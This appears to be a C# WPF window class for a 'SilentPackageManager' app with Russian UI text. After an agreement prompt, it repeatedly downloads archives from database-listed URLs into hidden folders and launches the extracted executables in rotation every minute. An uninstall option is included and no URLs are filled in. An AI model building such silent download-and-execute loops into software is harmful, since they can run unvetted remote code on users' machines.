using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using SilentPackageManager.Core;
using SilentPackageManager.Database;
using Microsoft.Data.Sqlite;

namespace SilentPackageManager.UI
{
    public partial class MainWindow : Window
    {
        private static readonly TimeSpan LaunchInterval = TimeSpan.FromMinutes(1);
        private static readonly TimeSpan DownloadCheckInterval = TimeSpan.FromMinutes(2);

        private readonly DatabaseManager _dbManager = new();
        private readonly bool _isAlreadyInstalled;
        private CancellationTokenSource? _engineCancellation;

        public MainWindow()
        {
            InitializeComponent();
            
            AppLogger.OnLogMessage += AppLogger_OnLogMessage;

            _isAlreadyInstalled = _dbManager.DatabaseExists;

            _isAlreadyInstalled = _dbManager.DatabaseExists;

            if (_isAlreadyInstalled)
            {
                Title = "SilentPackageManager - Деинсталляция";
                InstructionText.Text = "Программа уже установлена. Нажмите кнопку ниже, чтобы завершить процессы и удалить контент.";
                AcceptButton.Content = "Удалить все изменения";
                AcceptButton.Background = new SolidColorBrush(Color.FromRgb(209, 52, 56));
            }
        }
        
        private void AppLogger_OnLogMessage(string message)
        {
            Dispatcher.InvokeAsync(() =>
            {
                LogTextBox.AppendText(message + Environment.NewLine);
                LogTextBox.ScrollToEnd();
            });
        }

        private void AcceptButton_Click(object sender, RoutedEventArgs e)
        {
            if (_isAlreadyInstalled)
            {
                PurgeInstalledContent();
                return;
            }

            StartLauncher();
        }

        private void PurgeInstalledContent()
        {
            try
            {
                _dbManager.PurgeEverything();
                MessageBox.Show("Очистка успешно завершена. Данные удалены.", "Успех", MessageBoxButton.OK, MessageBoxImage.Information);
                Application.Current.Shutdown();
            }
            catch (Exception ex)
            {
                AppLogger.Log(ex, "Purge failed");
                MessageBox.Show($"Ошибка при удалении компонентов: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void StartLauncher()
        {
            MessageBox.Show("Соглашение принято. Запуск фоновых служб...", "Информация", MessageBoxButton.OK, MessageBoxImage.Information);
            
            _dbManager.InitializeDatabase();
            SeedDatabaseWithLinks();

            InstructionText.Text = "Служба работает. Окно можно закрыть.";
            AcceptButton.IsEnabled = false;

            _engineCancellation = new CancellationTokenSource();
            
            // Разделение задач: одна скачивает, другая запускает
            _ = Task.Run(() => DownloadEngineAsync(_engineCancellation.Token));
            _ = Task.Run(() => LaunchEngineAsync(_engineCancellation.Token));
        }

        private void SeedDatabaseWithLinks()
        {
            using var connection = _dbManager.CreateConnection();
            connection.Open();

            using var checkCmd = new SqliteCommand("SELECT COUNT(*) FROM Games", connection);
            long count = (long)checkCmd.ExecuteScalar()!;
            if (count != 0) return;

            string[] gameUrls =
            {
            };

            foreach (string url in gameUrls)
            {
                using var insertCmd = new SqliteCommand(
                    "INSERT INTO Games (DownloadUrl, TargetDirectory, ExePath) VALUES (@url, '', '')", connection);
                insertCmd.Parameters.AddWithValue("@url", url);
                insertCmd.ExecuteNonQuery();
            }
        }

        private async Task DownloadEngineAsync(CancellationToken cancellationToken)
        {
            var downloader = new Downloader();

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    await DownloadMissingGamesAsync(downloader, cancellationToken).ConfigureAwait(false);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    AppLogger.Log(ex, "Download engine failed");
                }

                await Task.Delay(DownloadCheckInterval, cancellationToken).ConfigureAwait(false);
            }
        }

        private async Task LaunchEngineAsync(CancellationToken cancellationToken)
        {
            int nextGameIndex = 0;

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    List<string> gameExePaths = GetReadyGameExePaths();
                    if (gameExePaths.Count > 0)
                    {
                        string exeToRun = gameExePaths[nextGameIndex % gameExePaths.Count];
                        nextGameIndex++;
                        LaunchGame(exeToRun);
                    }
                    else
                    {
                        AppLogger.Log("No downloaded games are ready to launch.");
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    AppLogger.Log(ex, "Launch engine failed");
                }

                await Task.Delay(LaunchInterval, cancellationToken).ConfigureAwait(false);
            }
        }

        private async Task DownloadMissingGamesAsync(Downloader downloader, CancellationToken cancellationToken)
        {
            List<(int Id, string Url)> pendingDownloads = GetPendingDownloads();
    
            foreach (var download in pendingDownloads)
            {
                cancellationToken.ThrowIfCancellationRequested();
                try
                {
                    AppLogger.Log($"Инициализация загрузки для ID {download.Id}...");
            
                    string gameName = $"Game_{download.Id}";
                    string targetFolder = _dbManager.GenerateHiddenPath(gameName);
                    string exePath = await downloader
                        .DownloadAndExtractAsync(download.Url, targetFolder, cancellationToken)
                        .ConfigureAwait(false);

                    if (string.IsNullOrWhiteSpace(exePath))
                    {
                        AppLogger.Log($"[Ошибка] Архив для ID {download.Id} распакован, но исполняемый файл (.exe) не найден.");
                        continue;
                    }

                    MarkGameAsDownloaded(download.Id, targetFolder, exePath);
                    AppLogger.Log($"Успех: Игра ID {download.Id} готова к запуску. Путь: {exePath}");
                }
                catch (Exception ex)
                {
                    AppLogger.Log(ex, $"Ошибка при скачивании/распаковке ID {download.Id}");
                }
            }
        }

        private List<(int Id, string Url)> GetPendingDownloads()
        {
            var downloads = new List<(int Id, string Url)>();
            using var connection = _dbManager.CreateConnection();
            connection.Open();
            using var selectCmd = new SqliteCommand("SELECT Id, DownloadUrl FROM Games WHERE IsDownloaded = 0", connection);
            using var reader = selectCmd.ExecuteReader();
            
            while (reader.Read())
            {
                downloads.Add((reader.GetInt32(0), reader.GetString(1)));
            }

            return downloads;
        }

        private void MarkGameAsDownloaded(int id, string targetFolder, string exePath)
        {
            using var connection = _dbManager.CreateConnection();
            connection.Open();
            using var updateCmd = new SqliteCommand(
                "UPDATE Games SET TargetDirectory = @dir, ExePath = @exe, IsDownloaded = 1 WHERE Id = @id",
                connection);
            updateCmd.Parameters.AddWithValue("@dir", targetFolder);
            updateCmd.Parameters.AddWithValue("@exe", exePath);
            updateCmd.Parameters.AddWithValue("@id", id);
            updateCmd.ExecuteNonQuery();
        }

        private List<string> GetReadyGameExePaths()
        {
            var exePaths = new List<string>();
            using var connection = _dbManager.CreateConnection();
            connection.Open();
            using var command = new SqliteCommand("SELECT ExePath FROM Games WHERE IsDownloaded = 1 ORDER BY Id", connection);
            using var reader = command.ExecuteReader();
            
            while (reader.Read())
            {
                string exePath = reader.IsDBNull(0) ? string.Empty : reader.GetString(0);
                if (File.Exists(exePath))
                {
                    exePaths.Add(exePath);
                }
                else if (!string.IsNullOrWhiteSpace(exePath))
                {
                    AppLogger.Log($"Downloaded game exe is missing: {exePath}");
                }
            }

            return exePaths;
        }

        private static void LaunchGame(string exePath)
        {
            try
            {
                string? gameFolder = Path.GetDirectoryName(exePath);
                if (string.IsNullOrWhiteSpace(gameFolder))
                {
                    AppLogger.Log($"Cannot launch game without folder: {exePath}");
                    return;
                }

                var startInfo = new ProcessStartInfo
                {
                    FileName = exePath,
                    WorkingDirectory = gameFolder,
                    UseShellExecute = true
                };

                var process = new Process { StartInfo = startInfo, EnableRaisingEvents = true };
                
                process.Exited += (sender, args) =>
                {
                    AppLogger.Log($"Game closed: {exePath}");
                    process.Dispose();
                };

                process.Start();
                AppLogger.Log($"Game launched: {exePath}");
            }
            catch (Exception ex)
            {
                AppLogger.Log(ex, $"Failed to start process {exePath}");
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            AppLogger.OnLogMessage -= AppLogger_OnLogMessage;
            _engineCancellation?.Cancel();
            _engineCancellation?.Dispose();
            base.OnClosed(e);
        }
    }
}